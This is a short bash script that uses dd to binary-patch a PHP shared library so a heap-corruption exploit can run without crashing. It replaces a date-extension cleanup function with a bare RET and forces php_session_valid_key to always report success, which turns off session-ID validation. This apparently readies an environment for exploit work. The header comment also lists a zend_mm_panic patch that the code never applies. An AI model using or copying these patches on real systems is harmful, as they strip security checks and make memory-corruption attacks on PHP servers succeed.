#!/bin/bash
# Binary-patch libphp.so so the exploit's controlled heap corruption
# does not trigger fatal aborts during OOM recovery:
#
# 1. zm_post_zend_deactivate_date → ret  (date extension walks freed heap)
# 2. zend_mm_panic → ret                 (allocator integrity check aborts)
#
# Both write 0xc3 (x86-64 RET) at the function entry point.
set -e

LIB=$(php -r 'echo PHP_EXTENSION_DIR;')/../modules/date.so
if [ ! -f "$LIB" ]; then
    LIB=$(php -r 'echo PHP_PREFIX;')/lib/apache2/modules/libphp.so
fi
if [ ! -f "$LIB" ]; then
    LIB=$(find / -name "libphp*.so" 2>/dev/null | head -1)
fi
echo "Target library: $LIB"

patch_func() {
    local FUNC=$1
    local ADDR
    ADDR=$(objdump -t "$LIB" | grep " $FUNC" | awk '{print $1}')
    if [ -z "$ADDR" ]; then
        echo "ERROR: $FUNC not found in $LIB" >&2
        exit 1
    fi
    local OFFSET=$((16#$ADDR))
    printf '\xc3' | dd of="$LIB" bs=1 seek=$OFFSET conv=notrunc 2>/dev/null
    echo "Patched $FUNC at offset 0x$ADDR"
}

patch_func zm_post_zend_deactivate_date

# php_session_valid_key rejects binary heap bytes in stale PS(id).
# Patch to: xor eax,eax; ret  (always return SUCCESS=0)
ADDR=$(objdump -t "$LIB" | grep ' php_session_valid_key' | awk '{print $1}')
if [ -z "$ADDR" ]; then
    echo "ERROR: php_session_valid_key not found in $LIB" >&2
    exit 1
fi
OFFSET=$((16#$ADDR))
printf '\x31\xc0\xc3' | dd of="$LIB" bs=1 seek=$OFFSET conv=notrunc 2>/dev/null
echo "Patched php_session_valid_key at offset 0x$ADDR (xor eax,eax; ret)"
